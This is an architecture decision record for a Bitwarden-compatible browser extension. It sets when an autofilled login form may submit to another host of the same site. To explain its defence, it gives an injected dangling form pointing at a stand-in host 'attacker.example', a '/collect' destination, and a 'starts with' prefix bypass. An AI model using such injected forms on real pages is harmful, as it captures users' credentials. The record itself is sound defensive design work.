# ADR 0051: A form may submit to another host of the site its item matches

Status: accepted by the owner on 2026-10-19 at 01:29 UTC. Asked which rule applies when
a login form submits to another host of the same site, the owner chose 「項目のルール」:
the login's vault item decides under its own URI match detection. Earlier, on 2026-10-18
at 04:30 UTC, the owner had asked to follow the official clients' per-URL rules and to
record the rule in an ADR. Implemented (local tests only; not yet checked on a real
site). Amends the form destination check of
[issue #636](https://github.com/risu729/pateat/issues/636)
([architecture](../architecture.md#background-execution)).

Date: 2026-10-19

## Context

Since [#752](https://github.com/risu729/pateat/pull/752), a fill into a form, or a click
that submits one, is refused with `form-off-origin` unless the submission's destination
(the submitter's `formaction`, else the form's `action`, resolved against the document's
base URL) has the document's own origin or is a `javascript:` URL. Injected markup could
otherwise choose the destination: a dangling `<form action="https://attacker.example/">`
takes over the page's inputs. Same origin was a default, and it refuses a login page on
`login.example.com` whose form posts to `auth.example.com`.

The official Bitwarden clients do not check where a form submits.
[bitwarden/clients `abccf1e`](https://github.com/bitwarden/clients/tree/abccf1e342dccba06a3cc635cd4c706defa64a32)
resolves the action in
`apps/browser/src/autofill/services/collect-autofill-content.service.ts`
(`getFormActionAttribute`) only for form-classification keywords, and reads no
`formaction`. They apply an item's URI match detection (base domain, host, starts with,
exact, regular expression, never; the default; equivalent domains) to the tab's URL and
to a frame's URL. Pateat implements the same rules in `packages/bitwarden/src/uri.ts`
and already applies them to a frame's tab
([ADR 0017](0017-login-forms-in-frames.md)).

Applying an item's rules to any destination would let injected markup choose one they
match: raw "starts with" matches `https://login.example.com.attacker.example/` for the
URI `https://login.example.com`, and equivalent domains span different sites. A login
whose tab then lands on another site fails as `left-origin` anyway (ADR 0022's
`loginMoveFits` accepts only a move within the site before a second factor).

## Decision

A destination off the document's origin is allowed only when the background answers
that all of these hold, and the step is refused otherwise:

- it is an `https:` URL, or an `http:` one when the document itself is `http:`
  ([ADR 0050](0050-http-pages-for-http-items.md)): `insecure`;
- it has no user name or password in the URL, and it is on the document's site, by the
  registrable domain Bitwarden's Domain match compares: `cross-site`;
- its site is admitted as a page would be: not excluded and with host access granted:
  `no-site-access`;
- the login's chosen item matches its full URL: through the item's static allowed
  origins, or a live Bitwarden URI match under the item's own match detection (or the
  default), as ADR 0017 checks a frame's tab: `item-mismatch`.

| Item URI (`https://login.example.com`) | Destination | Result |
| --- | --- | --- |
| Base domain (default) | `https://auth.example.com/session` | fills |
| Host | `https://auth.example.com/session` | refused (`item-mismatch`) |
| Base domain | `https://attacker.example/collect` | refused (`cross-site`) |
| Base domain | `http://auth.example.com/session` from an `https:` page | refused (`insecure`) |

- The content script still decides alone what it can: the document's origin and
  `javascript:` URLs are allowed, and `data:`, `vbscript:`, other schemes and unparsable
  values are refused. Only an HTTP(S) destination on another origin is sent to the
  background, with the attempt's token and current operation
  (`login.destination.check`). The background answers only for the attempt and operation
  the document holds, while it is still valid and the settings are unchanged and still
  allow it (`not-authorized` otherwise).
- When the settings could not be read or the item's rules could not be evaluated now
  (the vault is locked, the item's URIs are unavailable), the answer is `unchecked`, and
  a worker that does not answer counts the same: the step fails with the detail
  `form-destination-unchecked`; every other refusal keeps `form-off-origin`. A refused
  fill is retried like any failed fill, and a refused click ends the attempt
  `structural-mismatch`, as before.
- After the answers, a document cancelled or an operation expired meanwhile cancels the
  step (`document-cancelled`, `operation-expired`). The content script then reads the
  destinations again; one that changed meanwhile fails the step as `form-changed`.
- The destination URL goes to the background only, never to a log or the service; the
  log keeps the detail code.

## Consequences

- A same-site form destination is as trusted as the item's own URIs make it. Under the
  default base-domain match, every host of the registrable domain counts: user-content
  hosts not on the public suffix list, hosts taken over through a dangling DNS record,
  and same-site redirects all receive the values. A Host or Exact URI narrows that.
- Cross-site destinations stay refused even where an equivalent domain or a raw "starts
  with" prefix would match.
- Each fill or click into a form that submits to another origin costs one message to the
  background and, without a cached match, one URI evaluation in the crypto Worker.
- This differs from the official clients, which check no destination
  ([differences](../bitwarden-differences.md#form-destination)).
